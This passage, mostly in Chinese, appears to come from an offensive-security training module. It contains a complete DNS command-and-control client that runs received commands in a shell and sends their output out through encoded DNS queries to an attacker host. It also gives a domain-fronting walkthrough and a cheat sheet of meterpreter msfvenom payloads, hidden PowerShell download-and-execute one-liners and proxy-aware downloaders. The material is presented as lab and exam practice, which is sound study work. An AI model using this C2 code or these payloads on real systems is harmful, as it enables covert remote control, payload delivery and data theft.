    print(f"[*] DNS C2 监听 {args.listen}:{args.port}  domain={args.domain}  outdir={args.outdir}", flush=True)

    threading.Thread(target=console, args=(args.domain,), daemon=True).start()
    while True:
        data, addr = s.recvfrom(4096)
        reply = handle(data, args.domain, args.outdir)
        if reply:
            s.sendto(reply, addr)

if __name__ == "__main__":
    main()
````

#### `m09-dns-c2-client.py`

````python
#!/usr/bin/env python3
"""用途：极简 DNS C2 客户端——与 m09-dns-c2-server.py 配套，用 DNS 查询做心跳取命令、回传命令输出。
        全部使用 Python 标准库（socket 自己构造 DNS 报文，不依赖 dnspython / requests），
        以便在没有第三方库的目标上直接跑。

场景：32（HTTP(S) 与代理均不通，但实验/考试环境允许 DNS 通道时的应急命令通道）。

依赖：Python 3（标准库：socket/struct/binascii/subprocess）；目标需能向 --server 发起 UDP 53 查询。
      无 Python 解释器的目标：用 dnscat2 客户端，或按文件末尾"移植要点"改成 PowerShell（Resolve-DnsName）。

使用：
    python3 m09-dns-c2-client.py --server LHOST --port 53 --domain c2.example \
        --session a1b2c3d4 --interval 2
    # 服务端控制台：list / send a1b2c3d4 whoami /priv / quit

占位符：LHOST=--server（DNS 服务器/攻击机 IP）、LPORT=--port（默认 53）、DOMAIN=--domain（通道域后缀）、
        --session=8 位 hex 会话 ID（不填则随机生成并打印）

协议约定（与 m09-dns-c2-server.py 严格对应）：
    心跳取命令：查询 A   h.<session>.<domain>
                → 服务端把待下发命令按 4 字节一组塞进 A 记录 rdata（每次心跳最多 40 字节），
                  命令以 b"\\n" 结尾；客户端累积到 b"\\n" 才认为一条命令收全。
    回传输出：  查询 A   o.<session>.<hex块0>.<hex块1>...<domain>
                → 服务端把各 hex 标签拼接后 unhexlify，追加写入 outdir/<session>.out

测试状态：已用 python3 -m py_compile 通过；已与 m09-dns-c2-server.py 在 127.0.0.1 做过直连回路测试
          （服务端收到心跳、下发命令、收到回传输出）。真实域 NS 部署形态需在实验环境验证。

已知问题（属于服务端，本客户端不改）：m09-dns-c2-server.py 的 build_reply() 里
    struct.pack(">HHHHH", tid, flags, 1, len(rdatas), 0, 0)
  给 5 个 H 传了 6 个值，服务端每次应答都会 struct.error 崩溃；需由维护者改成 ">HHHHHH"。
  在服务端修复前，本客户端能正常发心跳，但取不到命令。
"""
import argparse
import binascii
import os
import random
import socket
import struct
import subprocess
import sys
import time

CMD_END = b"\n"        # 与服务端一致：命令结束标记
HEX_LABEL = 60         # 每个 DNS 标签放 60 个 hex 字符（<63，且为偶数便于按字节切分）
MAX_QNAME = 253        # DNS 名字总长上限
MAX_OUTPUT = 4096      # 单条命令回传的字节上限（超出截断，避免超长查询被丢弃）
DEFAULT_TIMEOUT = 60   # 单条命令本地执行超时（秒）

def encode_name(name):
    """把 a.b.c 编码成 DNS 线格式（每段 <=63）。"""
    out = b""
    for label in name.split("."):
        raw = label.encode("ascii")
        if len(raw) > 63:
            raise ValueError("label too long: " + label)
        out += bytes([len(raw)]) + raw
    return out + b"\x00"

def read_name(data, off):
    """解析 DNS 名字（支持 0xC0 压缩指针），返回 (名字, 结束偏移)。"""
    labels = []
    end = None
    jumped = False
    while True:
        if off >= len(data):
            raise ValueError("truncated name")
        ln = data[off]
        if ln == 0:
            off += 1
            if end is None:
                end = off
            break
        if ln & 0xC0 == 0xC0:
            ptr = struct.unpack(">H", data[off:off + 2])[0] & 0x3FFF
            if end is None:
                end = off + 2
            off = ptr
            jumped = True
            continue
        labels.append(data[off + 1:off + 1 + ln].decode("ascii", "ignore"))
        off += 1 + ln
    if jumped and end is None:
        end = off
    return ".".join(labels), end

def build_query(qname, qtype=1):
    """构造标准 DNS 查询报文（qtype 默认 A）。"""
    tid = random.randint(0, 0xFFFF)
    header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    return tid, header + encode_name(qname) + struct.pack(">HH", qtype, 1)

def parse_a_records(data, want_tid):
    """解析应答，返回 A 记录的 4 字节 rdata 列表；tid 不匹配或异常时返回空列表。"""
    if len(data) < 12:
        return []
    tid, _flags, qd, an, _ns, _ar = struct.unpack(">HHHHHH", data[:12])
    if tid != want_tid:
        return []
    off = 12
    try:
        for _ in range(qd):
            _name, off = read_name(data, off)
            off += 4                      # qtype + qclass
        out = []
        for _ in range(an):
            _name, off = read_name(data, off)
            if off + 10 > len(data):
                break
            rtype, _rclass, _ttl, rdlen = struct.unpack(">HHIH", data[off:off + 10])
            off += 10
            rdata = data[off:off + rdlen]
            off += rdlen
            if rtype == 1 and rdlen == 4:
                out.append(rdata)
        return out
    except (ValueError, struct.error):
        return []

def dns_query(server, port, qname, timeout=3.0, retries=2):
    """发一次 A 查询，返回 A 记录 rdata 列表（失败/超时返回空列表）。"""
    for _ in range(retries + 1):
        try:
            tid, packet = build_query(qname)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            try:
                s.sendto(packet, (server, port))
                data, _addr = s.recvfrom(4096)
            finally:
                s.close()
            records = parse_a_records(data, tid)
            if records is not None:
                return records
        except (socket.timeout, OSError):
            time.sleep(0.2)
    return []

def fetch_command(server, port, session, domain, timeout):
    """心跳：h.<session>.<domain>，返回本次收到的命令字节（可能是一条命令的一部分）。"""
    qname = "h.%s.%s" % (session, domain)
    if len(qname) > MAX_QNAME:
        print("[-] qname 过长: %s" % qname, flush=True)
        return b""
    chunks = dns_query(server, port, qname, timeout)
    return b"".join(chunks).rstrip(b"\x00")

def send_output(server, port, session, domain, data, timeout, max_output=MAX_OUTPUT):
    """回传输出：o.<session>.<hex...>.<domain>，按长度自动拆成多次查询。"""
    if not data:
        data = b"(none)"
    data = data[:max_output]
    hexs = binascii.hexlify(data).decode("ascii")
    labels = [hexs[i:i + HEX_LABEL] for i in range(0, len(hexs), HEX_LABEL)]
    if not labels:
        labels = ["00"]

    prefix = "o." + session + "."
    suffix = "." + domain
    cap = MAX_QNAME - len(prefix) - len(suffix)
    if cap <= 0:
        print("[-] 域后缀过长，无法回传", flush=True)
        return

    batch, batch_len = [], 0
    sent = 0
    for label in labels:
        cost = len(label) + 1
        if batch and batch_len + cost > cap:
            dns_query(server, port, prefix + ".".join(batch) + suffix, timeout, retries=1)
            sent += 1
            batch, batch_len = [], 0
        batch.append(label)
        batch_len += cost
    if batch:
        dns_query(server, port, prefix + ".".join(batch) + suffix, timeout, retries=1)
        sent += 1
    print("[>] 回传 %d 字节（%d 次查询）" % (len(data), sent), flush=True)

def run_command(cmd_bytes, timeout):
    """本地执行命令，返回 stdout+stderr 字节。"""
    try:
        cmd = cmd_bytes.decode("utf-8", "replace").strip()
    except AttributeError:
        cmd = str(cmd_bytes).strip()
    if not cmd:
        return b"(empty command)"
    print("[+] 执行: %s" % cmd, flush=True)
    try:
        if os.name == "nt":
            p = subprocess.Popen(cmd, shell=True,
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            p = subprocess.Popen(["/bin/sh", "-c", cmd],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            out, err = p.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            p.kill()
            out, err = p.communicate()
            return (out or b"") + (err or b"") + b"\n[!] timeout"
        result = (out or b"") + (err or b"")
        return result if result else b"(no output)"
    except OSError as e:
        return ("exec error: %s" % e).encode()

def main():
    ap = argparse.ArgumentParser(
        description="极简 DNS C2 客户端（场景 32，与 m09-dns-c2-server.py 配套）")
    ap.add_argument("--server", required=True, help="DNS 服务器地址（LHOST）")
    ap.add_argument("--port", type=int, default=53, help="DNS 服务器端口（默认 53）")
    ap.add_argument("--domain", required=True, help="通道域后缀，如 c2.example")
    ap.add_argument("--session", default="", help="会话 ID（8 位 hex）；不填则随机生成")
    ap.add_argument("--interval", type=float, default=2.0, help="心跳间隔秒（默认 2）")
    ap.add_argument("--dns-timeout", type=float, default=3.0, help="单次 DNS 超时秒")
    ap.add_argument("--cmd-timeout", type=int, default=DEFAULT_TIMEOUT, help="单条命令执行超时秒")
    ap.add_argument("--max-output", type=int, default=MAX_OUTPUT, help="单条命令回传字节上限")
    ap.add_argument("--count", type=int, default=0, help="心跳次数上限，0=不限（便于一次性测试）")
    args = ap.parse_args()

    session = args.session.strip().lower()
    if not session:
        session = "%08x" % random.getrandbits(32)
    if len(session) > 16 or any(c not in "0123456789abcdef" for c in session):
        print("[-] --session 必须是 <=16 位的 hex", file=sys.stderr)
        return 2

    print("[*] DNS C2 客户端启动", flush=True)
    print("[*] server=%s:%d domain=%s session=%s interval=%.1fs"
          % (args.server, args.port, args.domain, session, args.interval), flush=True)
    print("[*] 退出: Ctrl+C", flush=True)

    buf = b""
    beats = 0
    try:
        while True:
            if args.count and beats >= args.count:
                break
            beats += 1
            chunk = fetch_command(args.server, args.port, session,
                                  args.domain, args.dns_timeout)
            if chunk:
                buf += chunk
                while CMD_END in buf:
                    cmd, buf = buf.split(CMD_END, 1)
                    output = run_command(cmd, args.cmd_timeout)
                    send_output(args.server, args.port, session, args.domain,
                                output, args.dns_timeout, args.max_output)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] 收到中断，退出", flush=True)
    return 0

if __name__ == "__main__":
    sys.exit(main())

# ============================================================
# 移植要点（目标无 Python 时）
#   PowerShell：Resolve-DnsName -Name "h.<session>.<domain>" -Type A -Server LHOST
#     → 取应答里每条 A 记录的 IPAddress，把 4 个字节按点分十进制拆开还原成命令字节；
#     回传用 Resolve-DnsName -Name "o.<session>.<hex>.<domain>" -Type A -Server LHOST 即可（结果丢弃，服务端已记录）。
#   dnscat2：服务端 dnscat2-server --domain c2.example，客户端 dnscat2 二进制，适合需要真正交互式 shell 时。
#   UDP 53 被拦但 TCP 53 通：本脚本仅覆盖 UDP，需换支持 TCP 的隧道工具。
# ============================================================
````

**验证**：服务器控制台收到会话心跳（`[+] session ...`）并打印命令输出；`tcpdump -i eth0 udp port 53` 能看到规律的 `x.<session>.c2.example` 查询。

**失败分支与备选**：
- 出口 DNS 只解析内网/被强制走内网 DNS → 内网 DNS 是否能把 `c2.example` 转发给你的权威服务器？不行则此场景不通（换 28/31）。
- 目标无 Python 解释器 → 用编译好的 dnscat2 客户端，或把客户端逻辑移植成 PowerShell（用 `Resolve-DnsName`），脚本头注释给出移植要点。
- 隧道被封（请求频率/长标签检测）→ 降 `--interval`、缩短单包负载、命令少而精。
- UDP 53 被拦但 TCP 53 通 → 需支持 TCP 的隧道工具（dnscat2 支持），自写脚本仅覆盖 UDP。

**考试注意 / OPSEC**：长 hex 子域 + 高频心跳是强检测特征，只在该实验规则允许时使用（场景前提写明"课程实验允许"）；命令输出别一次拉太大；DNS 服务器起在 53 前确认端口空闲且不会被目标出口策略单独拦。

---

## 场景 33：目标限制访问目的域名，且实验基础设施支持域前置

**场景回顾**：目标只允许访问特定前端地址，直接访问后端不通；实验基础设施支持"前端与后端分离"（教材 §14.6）。

**前提与假设**：有一个目标**允许访问**的前端地址（FRONT 域名/IP）；存在一个能按 HTTP Host 头把请求路由到后端的设施——真实 CDN（如 Azure Front Door）或自建 nginx 反向代理模拟；后端 = 你的 C2/投递服务器。**域前置成立的关键**：出口检查看到的是 TLS SNI/目的地址 = FRONT（放行），而 HTTP Host 头 = 后端路由用。

**准备（攻击机侧）**：自建实验室版前端 nginx（443 + FRONT 证书）+ 后端监听：

```bash
# nginx 前端配置见 m09-domain-fronting-nginx.conf
# 后端 C2/投递监听
bash m09-https-listener.sh --mode ssl-test --cert cert.pem --key key.pem --port 8443
# 或 msf: use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; run
```

**执行步骤**：
1. 目标侧确认到 FRONT:443 通（`Test-NetConnection FRONT -Port 443`），到后端直连不通。
2. 客户端访问模板——TLS 连 FRONT，HTTP 头带后端 Host：
```bash
# 目标侧 curl（Windows 10+ 自带）
curl -k https://FRONT/ -H "Host: BACKEND" --resolve FRONT:443:FRONT_IP -o PAYLOAD
```
```powershell
# 或 PowerShell 下载器/回连，Host 头指向后端 vhost
# $c = New-Object Net.WebClient; $c.Headers.Add("Host","BACKEND"); $c.DownloadString("https://FRONT/PAYLOAD")
```
3. nginx 前端按 Host 路由：Host=FRONT → 正常页面（掩护）；Host=BACKEND → `proxy_pass` 到后端监听。出口处看到的只有 FRONT（SNI/证书/目的域名都匹配放行规则）。
4. 验证：后端监听收到来自目标的请求（来源会是前端 IP 或目标 IP，取决于代理位置）；下载/会话成功。
5. 真实 CDN 版：把 BACKEND 注册为 CDN 后端源站，前端域名用目标放行的那个；先做一次无害 GET 验证路由再上 payload。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m09-domain-fronting-nginx.conf` | 自建域前置前端（按 Host 路由到后端） | 替换 FRONT / BACKEND / 证书路径 |
| `m09-https-listener.sh` | 后端 HTTPS 监听/投递 | `--port 8443` |
| `m09-proxy-aware-downloader.ps1` | 目标侧下载（可设 Host 头） | `-Url https://FRONT/PAYLOAD -HostHeader BACKEND` |

**验证**：后端监听/nginx 日志出现目标请求且 Host=BACKEND；无害 GET 先通再上真实 payload；出口侧（如有抓包机会）确认只见 FRONT。

**失败分支与备选**：
- 前端按 SNI 而非 Host 路由 / 检查 SNI 与 Host 一致性 → 域前置不可用 → 回场景 28（代理）或 32（DNS）。
- CDN 不转发自定义 Host（很多 CDN 会 502/拒绝）→ 该实验基础设施不支持，改用自建前端，或放弃。
- 目标只放行 FRONT 且 FRONT 不是你能控制证书的域名 → 需要借用其证书链，通常不可行 → 换通道。

**考试注意 / OPSEC**：场景 33 是**基础设施依赖型**（场景原文明确"依赖具体服务支持"）——考前用无害 GET 验证一次路由，考试里不要第一次就上 payload；域前置需要 Host 与 SNI 分离的理解，说不清机制就不要在报告里硬写。

---

## 模块速查表

```bash
# 内嵌版 payload（场景 17）
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f ps1

# 编码 PowerShell 命令（场景 17/28/31；cheat sheet: Encode PowerShell Payloads）
echo -en 'iex((New-Object Net.WebClient).DownloadString("http://LHOST/PAYLOAD"))' | iconv -t UTF-16LE | base64 -w 0
powershell -nop -w hidden -enc <BASE64>

# 代理查看/设置（场景 28/29）
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
netsh winhttp show proxy && netsh winhttp set proxy proxy-server=http://proxy:8080 && netsh winhttp reset proxy

# 代理感知下载（场景 28/29/31）
powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/PAYLOAD -Command -DefaultCreds

# DNS 通道（场景 32，root 起 53）
sudo python3 m09-dns-c2-server.py --domain c2.example
python3 m09-dns-c2-client.py --server LHOST --session a1b2c3d4

# 域前置访问模板（场景 33）
curl -k https://FRONT/ -H "Host: BACKEND" --resolve FRONT:443:FRONT_IP -o PAYLOAD

# HTTPS 监听（场景 30/31/33）
bash m09-https-listener.sh --mode msf --cert cert.pem --key key.pem
```

## 关联脚本清单

| 脚本 | 对应场景 |
|---|---|
| `m09-proxy-aware-downloader.ps1` | 28、29、30、31 |
| `m09-dns-c2-server.py` | 32 |
| `m09-dns-c2-client.py` | 32 |
| `m09-domain-fronting-nginx.conf` | 33、31 |
| `m09-https-listener.sh` | 30、31、33 |

跨模块引用：`m00-delivery-server.py`（17/28/30 投递与日志）、`m01-shellcode-runner-vba-archbranch.vba`（17 内嵌）、`m03-dotnettojscript-loader.js`（17 桥接）、[08-pivoting-tunneling](/zh/modules/08-pivoting-tunneling)（29/30 隧道备选）。
